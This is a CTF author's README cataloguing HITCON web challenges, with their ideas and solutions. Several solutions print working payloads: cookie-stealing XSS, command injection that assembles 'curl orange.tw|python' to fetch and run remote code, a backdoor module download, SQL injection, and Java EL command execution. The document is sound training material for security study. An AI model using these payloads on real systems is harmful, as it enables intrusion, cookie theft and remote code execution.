
# My CTF Web Challenges

This is the repository of all CTF challenges I made, including the source code, write-up and idea explanation!
Hope you like it :)  


**P.s.** BTW, the `Babyfirst` series and `One Line PHP Challenge` are my favorite challenges. If you haven't enough time, please look them at least!

* [Babyfirst](#babyfirst)  
* [Babyfirst Revenge](#babyfirst-revenge)  
* [Babyfirst Revenge v2](#babyfirst-revenge-v2)  
* [One Line PHP Challenge](#one-line-php-challenge)  

<br>

And you can find me via:  
* Email: orange@chroot.org   
* Blog: [http://blog.orange.tw](http://blog.orange.tw/)   
* Twitter: [@orange_8361](https://twitter.com/orange_8361)  

<br>


## **Table of Content**

* [HITCON 2021](#W3rmup-PHP)
    * [W3rmup PHP](#W3rmup-PHP)
    * [One-Bit Man](#One-Bit-Man)
    * [Metamon Verse](#Metamon-Verse)
    * [FBI Warning](#FBI-Warning)
    * [Vulpixelize](#Vulpixelize)

* [HITCON 2020](#oShell)
    * [oShell](#oShell)
    * [oStyle](#oStyle)
    * [Return of Use-After-Flee](#return-of-use-after-flee)

* [HITCON 2019 Quals](#virtual-public-network)
    * [Virtual Public Network](#virtual-public-network)
    * [Bounty Pl33z](#bounty-pl33z)
    * [GoGo PowerSQL](#gogo-powersql)
    * [Luatic](#luatic)
    * [Buggy .Net](#buggy-net)  

* [HITCON 2018](#one-line-php-challenge)
    * [One Line PHP Challenge](#one-line-php-challenge)
    * [Baby Cake](#baby-cake)
    * [Oh My Raddit](#oh-my-raddit)
    * [Oh My Raddit v2](#oh-my-raddit-v2)
    * [Why so Serials?](#why-so-serials)  

* [HITCON 2017 Quals](#babyfirst-revenge)
    * [BabyFirst Revenge](#babyfirst-revenge)
    * [BabyFirst Revenge v2](#babyfirst-revenge-v2)
    * [SSRFme?](#ssrfme)
    * [SQL so Hard](#sql-so-hard)
    * [Baby^H Master PHP 2017](#babyh-master-php-2017)  

* [HITCON 2016 Quals](#papapa)
    * [%%%](#papapa)
    * [Leaking](#leaking)
    * [BabyTrick](#babytrick)
    * [Angry Boy](#angry-boy)
    * [Angry Seam](#angry-seam)  
    
* [HITCON 2015 Quals](#babyfirst)  
    * [Babyfirst](#babyfirst)
    * [nanana](#nanana)
    * [Giraffe's Coffee](#giraffes-coffee)
    * [lalala](#lalala)
    * [Use-After-FLEE](#use-after-flee)
    
* [HITCON 2014 Quals](#pushincat)
    * [PUSHIN CAT](#pushincat)
    * [PY4H4SHER](#py4h4sher)
    * [LEENODE](#leenode)
    
* [WCTF 2016](#blackbox)  
    * [BlackBox](#blackbox)

* [AIS3 Final 2015 Final](#sqlpwn)
    * [SQLPWN](#sqlpwn)
    
<br>

## **W3rmup PHP**
  
Difficulty: **★★**  
Solved: **22 / 666**  
Tag:   **PHP**, **Code Review**, **YAML** ,**Command Injection**  

#### Source Code

* [Source](hitcon-ctf-2021/W3rmup-PHP/)  

#### Idea

* [The Norway Problem](https://hitchdev.com/strictyaml/why/implicit-typing-removed/), the country code of Norway (NO) becomes `False` in YAML
* Bypass the `escapeshellarg` by the logic problem of `count()` + `unset()`  

#### Solution

* TBD

#### Write Ups

* TBD


## **One-Bit Man**
  
Difficulty: **★**  
Solved: **49 / 666**  
Tag:   **PHP**, **Code Review**

#### Source Code

* [Source](hitcon-ctf-2021/One-Bit-Man/)  

#### Idea

You can flip 1-bit on any file of the latest version of WordPress and you have to pwn the server.

#### Solution

Flip the position `5389` of the file `/var/www/html/wp-includes/user.php` to NOP the NOT (`!`) operation.

```php
    if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
            return new WP_Error(
```

#### Write Ups

* TBD



## **Metamon Verse**
  
Difficulty: **★★★☆**  
Solved: **9 / 666**  
Tag:   **NFS**, **SSRF** ,**RCE**  

#### Source Code

* [Source](hitcon-ctf-2021/Metamon-Verse/)  

#### Idea

The idea is using the SSRF to communicate with the local NFS/RPC server to get the RCE. To complete the exploit, you have to:

1. Construct the `RPC/PORTMAP_CALL` packet and send to `gopher://127.0.0.1:111/` to get the port of `mountd` service.
2. Construct the `RPC/MNT_CALL` packet and send to `gopher://127.0.0.1:<mnt-port>/` to get the file-handler of `/data` volume (remember to specify `CURLOPT_LOCALPORT` to bypass the authentication)
3. Construct the `RPC/NFS_CALL` packet and send to `gopher://127.0.0.1:2049/` to create a SYMLINK (remember to specify `CURLOPT_LOCALPORT` to bypass the authentication)
4. Symlink the `/app/templates/index.html` to a controllable file to get a SSTI and get the RCE!

#### Solution

An dirty exploit code can be found [here](https://gist.github.com/orangetw/6d34ff98a6332bc0523b35ea952a790d)

#### Write Ups

* TBD


## **FBI Warning**
  
Difficulty: **☆**  
Solved: **25 / 666**  
Tag:   **MISC**, **OSINT** ,**PHP**, **Code Review**

#### Source Code

* [Source](hitcon-ctf-2021/FBI-Warning/)  

#### Idea

The website uses a famous Message Board project [futaba-ng](https://github.com/futoase/futaba-ng), and the ID generation is based on `REMOTE_ADDR`:

```php
define("IDSEED", 'idの種');       //idの種
...
$now.=" ID:".substr(crypt(md5($_SERVER["REMOTE_ADDR"].IDSEED.gmdate("Ymd", $time+9*60*60)),'id'),-8);
```

#### Solution

Because of the known IP prefix, you can identify the IP address of Ωrange by brute-force easily.

```php
var_dump( substr(crypt(md5("219.91.64.47"."idの種"."20211203"),"id"),-8) == "ueyUrcwA" )
// bool(true)
```

#### Write Ups

* TBD



## **Vulpixelize**
  
Difficulty: **★☆**  
Solved: **41 / 666**  
Tag:   **Browser**, **Feature**

#### Source Code

* [Source](hitcon-ctf-2021/Vulpixelize/)

#### Idea

Use the Chrome new feature [Text Fragments](https://wicg.github.io/scroll-to-text-fragment/) to extract the flag.


#### Solution

* TBD

#### Write Ups

* TBD





## **oShell**
  
Difficulty: **★★**  
Solved: **21 / 1281**  
Tag:   **BlackBox**, **Shell** ,**Command Injection**  

#### Source Code

* [Source](hitcon-ctf-2020/oShell/)  

#### Solution

1. Leveraging `strace` in `htop` to read enable secret.
2. Writing `/home/oShell/.toprc` with `tcpdump -w`
3. Abusing `top` inspect feature to run arbitrary commands


#### Write Ups

* [Writeup from team FrenchRoomba](https://github.com/FrenchRoomba/ctf-writeup-HITCON-CTF-2020/tree/master/oShell)  


## **oStyle**
  
Difficulty: **★★☆**  
Solved: **10 / 1281**  
Tag:   **XSS**

#### Source Code

* [Source](hitcon-ctf-2020/oStyle/)  

#### Solution

* The default Apache installation enabled `mod_negotiation`, which allows `.var` mapping and you can specify arbitrary content-type there.

**test.var**
```
Content-language: en
Content-type: text/html
Body:----foo----

<script>
fetch('http://orange.tw/?' + escape(document.cookie))
</script>

----foo----

```


#### Write Ups

* TBD


## **Return of Use-After-Flee**
  
Difficulty: **★★★★★**  
Solved: **0 / 1281**  
Tag: **WhiteBox**, **PHP**, **UAF**, **PWN**  

#### Source Code

* [Source](hitcon-ctf-2020/Return-of-Use-After-Flee/)  

#### Solution

* Exploiting `CVE-2015-0273` to pop the shell without known binaries. More detail will be published in [my blog](http://blog.orange.tw/) soon.


#### Write Ups

* TBD



## **Virtual Public Network**
  
Difficulty: **★☆**  
Solved: **81 / 1147**  
Tag:   **WhiteBox**, **Perl**, **Command Injection**  

#### Source Code

* [Source](hitcon-ctf-2019/virtual-public-network/)  

#### Solution

* Refer my blog and Black Hat 2019 USA slides for details 
    * [Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!](https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html)
    * [Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)  

```
http://13.231.137.9/cgi-bin/diag.cgi
?options=-r@a="ls -alh /",system@a%23 2>tmp/orange.thtml <
&tpl=orange
```


#### Write Ups

* TBD


## **Bounty Pl33z**
  
Difficulty: **★★★☆**  
Solved: **30 / 1147**  
Tag:   **XSS**

#### Source Code

* [Website](hitcon-ctf-2019/bounty-pl33z/www/)  
* [XSS bot](hitcon-ctf-2019/bounty-pl33z/bot/)  

#### Solution

* Idea from [@FD](https://twitter.com/filedescriptor) - A little known JavaScript comment style [SingleLineHTMLOpenComment](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-SingleLineHTMLOpenComment) and [HTMLCloseComment](https://www.ecma-international.org/ecma-262/10.0/index.html#prod-annexB-HTMLCloseComment) in EMCA specification. 

Here we use unicode `U+2028` and `U+3002` to bypass `\n` and `.` filters.

```
http://3.114.5.202/fd.php
?q=ssl。orange。tw?xx"%2bdocument[`cookie`]%E2%80%A8-->
```

#### Unintended Solution

* Nesting template expression

```
http://3.114.5.202/fd.php
?q=ssl。orange。tw?`%2b"%2bdocument[`cookie`];(`${`
```

#### Write Ups

* TBD

## **GoGo PowerSQL**
  
Difficulty: **★★★☆**  
Solved: **16 / 1147**  
Tag:   **Environment Injection**, **MySQL Client Attack**

#### Source Code

* [Docker](hitcon-ctf-2019/gogo-powersql/)  

#### Solution

1. Buffer Overflow the `DB_HOST` in BSS
2. Due to the [patch](hitcon-ctf-2019/gogo-powersql/Dockerfile#L20), we can pollute environment variable which are not in the [Blacklist](https://github.com/embedthis/goahead/blob/v4.0.0/src/cgi.c#L170).
3. Hijack MySQL connection by ENV such as `LOCALDOMAIN` or `HOSTALIAES`
4. Read `/FLAG` by `LOAD DATA LOCAL INFILE`.

```python
import requests

payload = ['x=x' for x in range(254)]
payload.append('name=x')
payload.append('HOSTALIASES=/proc/self/fd/0')
payload.append('orangeeeee=go')
payload = '&'.join(payload)

data = 'orangeeeee my.orange.tw'

r = requests.post('http://13.231.38.172/cgi-bin/query?'+payload, data=data)
print r.content
```

```shell
$ git clone https://github.com/lcark/MysqlClientAttack.git
$ cd MysqlClientAttack
$ python main.py -F /FLAG
```



#### Write Ups

* TBD

## **Luatic**
  
Difficulty: **★★☆**  
Solved: **42 / 1147**  
Tag:   **WhiteBox**, **Redis**, **Lua**

#### Source Code

* [Docker](hitcon-ctf-2019/luatic/)  

#### Solution

1. Override PHP global variables.
2. Redis [implements](https://github.com/antirez/redis/blob/ee1cef189fff604f165b2d20a307545840de944e/src/scripting.c#L1363) `eval` command by string concatenations so that we can escape the original Lua function to override global objects.

```
http://54.250.242.183/luatic.php
?_POST[TEST_KEY]=return 1 end function math:random() return 2
&_POST[TEST_VALUE]=0
&_POST[MY_SET_COMMAND]=eval
&_POST[token]=<token>
&_POST[guess]=2
```

```
http://54.250.242.183/luatic.php
?_POST[token]=<token>
&_POST[guess]=2
```

#### Unintended Solution

* Lua is so magic that there are several unintended solutions. Sorry for the imperfect challenge :(

#### Write Ups

* TBD

## **Buggy .Net**
  
Difficulty: **★☆**  
Solved: **13 / 1147**  
Tag:   **ASP.NET**, **WhiteBox**

#### Source Code

* [Default.aspx](hitcon-ctf-2019/buggy-net/Default.aspx)  

#### Solution

* Using .NET request validation to trigger the exception and bypass the filter
* Idea from [Soroush Dalili](https://twitter.com/irsdl)'s  [WAF Bypass Techniques - Using HTTP Standard and Web Servers' Behaviour](https://www.slideshare.net/SoroushDalili/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour) in AppSec Europe 2018(p30~p34)  

```
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```

```python
from urllib import quote

s = lambda x: quote(x.encode('ibm500'))
print '%s=%s&x=%s' % (s('filename'), s('../../FLAG.txt', s('<x>'))
```

#### Write Ups

* TBD


## **One Line PHP Challenge**
  
Difficulty: **★★★★**  
Solved: **3 / 1816**  
Tag:   **PHP**

#### Source Code

* [index.php](hitcon-ctf-2018/one-line-php-challenge/src/index.php)  

#### Solution

P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04

1. Control partial session file content by `PHP_SESSION_UPLOAD_PROGRESS`
2. Bypass `session.upload_progress.cleanup = On` by `race condition` or `slow query`
3. Control the prefix to `@<?php` by chaining PHP wrappers

* [exp_for_php.py](hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py)
* [Offical writeup for One Line PHP Challenge](http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html)  

#### Write Ups

* [(English)One Line PHP Challenge](https://hackmd.io/s/B1A2JIjjm)  
* [(中文)One Line PHP Challenge](https://hackmd.io/s/SkxOwAqiQ)  
* [hitcon2018 One Line PHP Challenge](https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/)  
* [hitcon 2018受虐笔记一:one-line-php-challenge 学习](http://wonderkun.cc/index.html/?p=718)  

## **Baby Cake**
  
Difficulty: **★★★**  
Solved: **4 / 1816**  
Tag:   **Code Review**, **PHP**, **De-serialization**

#### Source Code

* [index.php](hitcon-ctf-2018/baby-cake/baby_cake.tgz)  

#### Solution

Due to the implement of **`CURLOPT_SAFE_UPLOAD`** in CakePHP `FormData.php`. We can read arbitrary files!

```sh
# arbitrary file read, listen port 12345 on your server
http://13.230.134.135/
?url=http://your_ip:12345/
&data[x]=@/etc/passwd

# arbitrary de-serialization the Monolog POP chain
http://13.230.134.135/
?url=http://your_ip:12345/
&data[x]=@phar://../tmp/cache/mycache/[you_ip]/[md5_of_url]/body.cache
```

* [exploit.phar](hitcon-ctf-2018/baby-cake/exploit.phar)

#### Write Ups

* [Baby Cake](https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake)  
* [Hitcon 2018 Web - Oh My Raddit / Baby Cake 题解](https://xz.aliyun.com/t/2961)  
* [HITCON CTF 2018 Web WP 之 Baby Cake](https://xz.aliyun.com/t/3035)  

## **Oh My Raddit**
  
Difficulty: **★★☆**  
Solved: **27 / 1816**  
Tag:   **Observation**, **DES checksum**, **Crypto**, **Web**

#### Source Code

* [app](hitcon-ctf-2018/oh-my-raddit/src/)  

#### Solution

1. Know `ECB` mode from block frequency analysis
2. Know `block size = 8` from cipher length
3. From the information above, it's reasonable to use `DES` in real world
4. The most common block is `3ca92540eb2d0a42`(always in the cipher end). We can guess it's the padding `\x08\x08\x08\x08\x08\x08\x08\x08`
5. Due to the checking parity in [DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard), we can reduce the keyspace from 26(`abcdefghijklmnopqrstuvwxyz`) to 13(`acegikmoqsuwy`)
    * Break in 1 second with `HashCat`
    * Break in 10 minutes with single thread Python

#### Write Ups

* [Oh My Raddit](https://github.com/pwning/public-writeup/blob/e818115a2c3a5d18e8191d37b5c3151823d43126/hitcon2018/oh-my-raddit/README.md)  
* [Oh my raddit](https://github.com/mdsnins/ctf-writeups/blob/b292621463b156d864bd2db062f31afe9aacb8d6/HITCON%202018/Oh%20my%20raddit.md)
* [2018HITCON-Oh My Raddit&v2题解](https://mochazz.github.io/2018/10/25/2018HITCON-Oh%20My%20Raddit&v2%E9%A2%98%E8%A7%A3/)  

## **Oh My Raddit v2**
  
Difficulty: **★★**  
Solved: **10 / 1816**  
Tag:   **Web.py**,  **SQL Injection to RCE**

#### Source Code

* [app](hitcon-ctf-2018/oh-my-raddit/src/)  

#### Solution

* Read the package version from `requirements.txt`
* [Remote Code Execution in Web.py framework](https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/)

* [exp.py](hitcon-ctf-2018/oh-my-raddit/exp.py)

#### Write Ups

* [Oh My Raddit V2](https://github.com/pwning/public-writeup/blob/c7273a8bd01710da0f2d9d9a3c8abe473b76bfde/hitcon2018/ohmyradditv2/README.md)
* [Oh My Raddit v2](https://ctftime.org/writeup/11931)  
* [2018HITCON-Oh My Raddit&v2题解](https://mochazz.github.io/2018/10/25/2018HITCON-Oh%20My%20Raddit&v2%E9%A2%98%E8%A7%A3/)  

## **Why so Serials?**
  
Difficulty: **★★★★**  
Solved: **1 / 1816**  
Tag:   **De-serialization**, **RCE**, **ASP.NET**, **View State**

#### Source Code

* [Default.aspx](hitcon-ctf-2018/why-so-serials/src/Default.aspx)  

#### Solution

1. Get the `machineKey` in `web.config` by Server-Side-Includes(`.shtml` or `.stm`)
2. Exploit `ASP.NET` `___VIEWSTATE` by [ysoserial.net](https://github.com/pwntester/ysoserial.net)

#### Write Ups

* [HITCON 2018: Why so Serials? Write-up](https://cyku.tw/ctf-hitcon-2018-why-so-serials/)  
* [HITCON CTF 2018 - Why so Serials? Writeup](https://xz.aliyun.com/t/3019)  


## **BabyFirst Revenge**
  
Difficulty: **★☆**  
Solved: **95 / 1541**  
Tag:  **WhiteBox**, **PHP**, **Command Injection**  

#### Idea

* Command Injection, but only in **5** bytes  

#### Source Code

* [index.php](hitcon-ctf-2017/babyfirst-revenge/index.php)  

#### Solution

```bash
# generate `ls -t>g` to file "_"
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

# generate `curl orange.tw|python` to file "g"
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _

# got shell
http://host/?cmd=sh g
```

You can check the [exploit.py](hitcon-ctf-2017/babyfirst-revenge/exploit.py) for the detail! And there are also lots of creative solutions, you can check the write ups below.


#### Write Ups

* [HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)  
* [HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)](http://www.jianshu.com/p/82788b6949c7)  
* [HITCON 2017 CTF BabyFirst Revenge](https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/)  
* [HITCON CTF 2017 - BabyFirst Revenge (172 pts.)](https://kimtruth.github.io/2017/11/06/HITCON-CTF-2017-BabyFirst-Revenge-172-pts/)  
* [Hitcon CTF 2017 - Baby Revenge](https://theromanxpl0it.github.io/ctf_hitcon2017/babyrevenge/)  
* [Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd)](https://losfuzzys.github.io/writeup/2017/11/06/hitconctf-babyfirstrevenge/)  
* [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)  
* [BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter](https://github.com/n4p5ter/BabyFirst-Revenge-HITCOIN-2017-QUALS)  



## **BabyFirst Revenge v2**
  
Difficulty: **★★★★**  
Solved: **8 / 1541**  
Tag:  **WhiteBox**, **PHP**, **Command Injection**  

#### Idea

* Command Injection, but only in **4** bytes  

#### Source Code

* [index.php](hitcon-ctf-2017/babyfirst-revenge-v2/index.php)  

#### Solution

1. generate `g> ht- sl` to file `v`
2. reverse file `v` to file `x`
4. generate `curl orange.tw|python;`
6. execute `x`, `ls -th >g`
7. execute `g`

You can check [exploit.py](hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py) for the detail!


#### Write Ups

* [Baby First Revenge v2 (Via vim) by @bennofs](https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md)  
* [\[python\] baby-exp.py](https://codegists.com/snippet/python/baby-exppy_beched_python)  
* [How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2](https://www.eugenekolo.com/blog/hitcon-babyfirst-revenge-v2/)  
* [HITCON CTF 2017 BabyFirst Revenge & v2 writeup](https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/)  



## **SSRFme?**
  
Difficulty: **★★☆**  
Solved: **20 / 1541**  
Tag:  **WhiteBox**, **Perl**, **PATH Pollution**  

#### Idea

* [CVE-2016-1238](https://perl5.git.perl.org/perl.git/commit/cee96d52c39b1e7b36e1c62d38bcd8d86e9a41ab) (But the latest version of Ubuntu 17.04 in AWS is still vulnerable)  
* Perl lookup current directory in module importing  
* Perl module [URI/lib/URI.pm#L136](https://github.com/libwww-perl/URI/blob/b7680860f323a0cf3ffe5f6bdb684646e1ecac33/lib/URI.pm#L136) will `eval` if there is a  unknown scheme

#### Source Code

* [index.php](hitcon-ctf-2017/ssrfme/index.php)  

```bash
$ sudo apt install libwww-perl
```

#### Solution

```bash
# write evil URI module to current directory
$ curl http://host/?filename=URI/orange.pm&url=http://orange.tw/w/backdoor.pl

# eval evil module `orange`
$ curl http://host/?filename=xxx&url=orange://orange.tw
```

#### Write Ups

* [Another Solution by @Paul_Axe](https://twitter.com/Paul_Axe/status/927669724439293953)  
* [HITCON 2017 SSRFme](https://ricterz.me/posts/HITCON%202017%20SSRFme)  
* [SSRFme by @sorgloomer](https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/ssrfme.md)  



## **SQL so Hard**
  
Difficulty: **★★★**  
Solved: **10 / 1541**  
Tag:  **WhiteBox**, **MySQL**, **PostgreSQL**, **SQL Injection**, **Code Injection**  

#### Idea

* MySQL `max_allowed_packet` dropped large size SQL sentence  
* [Node-Postgres - code execution vulnerability](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)  
* Exploit the RCE in SQL `UPDATE` syntax

#### Source Code

* [app.js](hitcon-ctf-2017/sql-so-hard/app.js)  

#### Solution

* [exploit.py](hitcon-ctf-2017/sql-so-hard/exploit.py)  

#### Write Ups

* [SQL so Hard by @sorgloomer](https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md)  


## **Baby^H Master PHP 2017**
  
Difficulty: **★★★★☆**  
Solved: **0 / 1541**  
Tag:  **WhiteBox**, **PHP**, **Serialization**, **Apache Prefock**  

#### Idea

* PHP do the de-serialization on `PHAR` parsing
* PHP assigned a predictable function name `\x00lambda_%d` to an anonymous function  
* Break shared VARIABLE state in Apache Pre-fork mode

#### Source Code

* [index.php](hitcon-ctf-2017/baby^h-master-php-2017/index.php)  

#### Solution

```bash
# get a cookie
$ curl http://host/ --cookie-jar cookie

# download .phar file from http://orange.tw/avatar.gif
$ curl -b cookie 'http://host/?m=upload&url=http://orange.tw/'

# force apache to fork new process
$ python fork.py &

# get flag
$ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=%00lambda_1"
```

* [avatar.gif](hitcon-ctf-2017/baby^h-master-php-2017/avatar.gif)  
* [fork.py](hitcon-ctf-2017/baby^h-master-php-2017/fork.py)

#### Write Ups

* [По умолчанию Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)  



## **papapa**
  
Difficulty: **★**  
Solved: **71 / 1024**  
Tag:  **BlackBox**, **SSL**, **Pentesting**  

#### Idea

* Leak the internal hostname from SSL certificate  

#### Source Code

* [here](hitcon-ctf-2016/papapa)  

#### Solution

```bash
$ openssl s_client -showcerts -connect 1.2.3.4:443 < /dev/null | openssl x509 -text | grep -A 1 "Subject Alternativer Name"
...
depth=0 C = TW, ST = Some-State, O = Internet Widgits Pty Ltd, CN = very-secret-area-for-ctf.orange.tw, emailAddress = orange@chroot.org
...
# get flag
$ curl -k  -H "host: very-secret-area-for-ctf.orange.tw" https://1.2.3.4/
```

#### Write Ups

* [HITCON 2016](https://dinhbaoluciusteam.wordpress.com/2016/10/10/hitcon-2016/)  
* [HITCON CTF 2016: %%% (Web) Write-up](http://icheernoom.blogspot.tw/2016/10/hitcon-ctf-2016-web-write-up.html)  
* [\[HITCON 2016\] \[WEB 100 - %%%\] WRITE UP](https://0x90r00t.com/2016/10/10/hitcon-2016-web-100-write-up/)  
* [hitcon2016 web writeup](http://lorexxar.cn/2016/10/10/hitcon2016/)  



## **Leaking**

Difficulty: **★★**  
Solved: **43 / 1024**  
Tag: **WhiteBox**, **JavaScript**, **NodeJS**  

#### Idea

* Break JavaScript Sandbox
* Use NodeJS `Buffer(int)` to steal uninitialized memory  
* [Node.js Buffer knows everything](https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md)

#### Source Code

* [here](hitcon-ctf-2016/leaking)

#### Solution

```bash
$ while true; do curl 'http://1.2.3.4/?data=Buffer(1e4)' | grep -a hitcon; done;

```

#### Write Ups

* [Hello HitCon 2016 CTF](https://ctfs.ghost.io/hello-hitcon-2016-ctf/#leaking)  
* [HITCON 2016 web 总结](http://0x48.pw/2016/10/14/0x24/)  
* [hitcon2016 web writeup](http://lorexxar.cn/2016/10/10/hitcon2016/)



## **BabyTrick**

Difficulty: **★★★**  
Solved: **24 / 1024**  
Tag: **WhiteBox**, **PHP**, **MySQL**, **SQL Injection**, **Unserialize**

#### Idea

* [Create an Unexpected Object and Don't Invoke \_\_wakeup() in Deserialization](https://bugs.php.net/bug.php?id=72663)
* [SugarCRM v6.5.23 PHP反序列化對象注入漏洞](http://blog.knownsec.com/2016/09/sugarcrm-v6-5-23-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)
* MySQL UTF-8 collation - `SELECT 'Ä'='a'` is True

#### Source Code

* [here](hitcon-ctf-2016/babytrick)

#### Solution

```bash
# get password
curl http://1.2.3.4/
?data=O:6:"HITCON":3:{s:14:"%00HITCON%00method";s:4:"show";s:12:"%00HITCON%00args";a:1:{i:0;s:39:"'union%20select%201,2,password%20from%20users%23";}}

# get flag
curl http://1.2.3.4/
?data=O:6:"HITCON":2:{s:14:"%00HITCON%00method";s:5:"login";s:12:"%00HITCON%00args";a:2:{i:0;s:7:"orÄnge";i:1;s:13:"babytrick1234";}}
```

#### Write Ups

* [Hitcon 2016 – Baby Trick](http://0xecute.com/index.php/2016/10/10/baby-trick/)
* [Hello HitCon 2016 CTF](https://ctfs.ghost.io/hello-hitcon-2016-ctf/#babytrick)  
* [hitcon2016 web writeup](http://lorexxar.cn/2016/10/10/hitcon2016/)




## **Angry Boy**

Difficulty: **★★☆**  
Solved: **43 / 1024**  
Tag: **GrayBox**, **Java**

#### Idea

* `new String(new byte[] {1, -1, 1, -1})` will output `01EFBFBD01EFBFBD`, not `01FF01FF`
* [When ‘EFBFBD’ And Friends Come Knocking: Observations Of Byte Array To String Conversions](https://blog.gdssecurity.com/labs/2015/2/18/when-efbfbd-and-friends-come-knocking-observations-of-byte-a.html)

#### Source Code

* [here](hitcon-ctf-2016/angry%20boy)

#### Solution

* [exploit.py](hitcon-ctf-2016/angry%20boy/exploit.py)
* [decrpt.py](hitcon-ctf-2016/angry%20boy/decrypt.py)

#### Write Ups

* [Angry Boy - Web 300 Problem](https://github.com/pwning/public-writeup/tree/master/hitcon2016/web300-angryboy)


## **Angry Seam**

Difficulty: **★★★★**  
Solved: **4 / 1024**  
Tag: **GrayBox**, **Java**, **Seam Framework**, **CSS RPO**, **EL Injection**, **Java Deserialization**  

#### Idea

* CSS Relative Path Overwrite  
* Built-in redirection parameter `actionOutcome`  
* [RPO Gadgets](http://blog.innerht.ml/rpo-gadgets/)  
* [CVE-2010-1871: JBoss Seam Framework remote code execution](http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html)  


#### Source Code

* [here](hitcon-ctf-2016/angry%20seam)

#### Solution

<br>

**P.s.** I made this challenge because once when I try to review the code of Seam Framework, I found some 0-days and I think it must have more. So I throw out the brick to attract a jade. And the result is more than I expected :P  

<br>

**Intended solution**  

* Register an account  
   ```
   username: `AAAAAA`    
   password: `AAAAAA`  
   realname: `{/*';*/}%0a@import'http://orange.tw/?`  
   ```

* Report URL  
    ```
    http://1.2.3.4:8080/angryseam/profile.seam?actionOutcom>e=/profile.seam?username%3dAAAAAA
    ```

<br>

**Unintended solution**  

* Register an account  
* Update description to  
* Login and access   

```
/?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}
```

```
GET /angryseam/template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) HTTP/1.1
host: 1.2.3.4
cmd: #{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('ccc'))}
ccc: ls -alh
...
```


**Unintended solution**  

* CVE-2013-2165 Java deserialization vulnerability

<br>

**Unintended solution**  

* SESSION manipulation... seam SUCKS  

#### Write Ups

* [Web500 Hitconctf 2016 and exploit CVE-2013-2165](http://vnprogramming.com/index.php/2016/10/10/web500-hitconctf-2016-and-exploit-cve-2013-2165/)
* [Angry Seam (500 pts)](https://github.com/Blaklis/write-ups/tree/master/hitcon)

## **Babyfirst**

Solved: **33 / 969**  
Difficulty: **★★**  
Tag: **WhiteBox**, **PHP**, **Command Injection**  

#### Idea

* Use `NewLine` to bypass regular expression check  
* Command injection only with alphanumeric characters  

#### Source Code

* [here](hitcon-ctf-2015/babyfirst)  

```php
<?php
    highlight_file(__FILE__);

    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
    if ( !file_exists($dir) )
        mkdir($dir);
    chdir($dir);

    $args = $_GET['args'];
    for ( $i=0; $i<count($args); $i++ ){
        if ( !preg_match('/^\w+$/', $args[$i]) )
            exit();
    }

    exec("/bin/orange " . implode(" ", $args));
?>
```


#### Solution

```text
http://localhost/
?args[0]=x%0a
&args[1]=mkdir
&args[2]=orange%0a
&args[3]=cd
&args[4]=orange%0a
&args[5]=wget
&args[6]=846465263%0a

http://localhost/
?args[0]=x%0a
&args[1]=tar
&args[2]=cvf
&args[3]=aa
&args[4]=orange%0a
&args[5]=php
&args[6]=aa
```

And there are also lots of creative solutions, you can check the write ups below.  


#### Write Ups

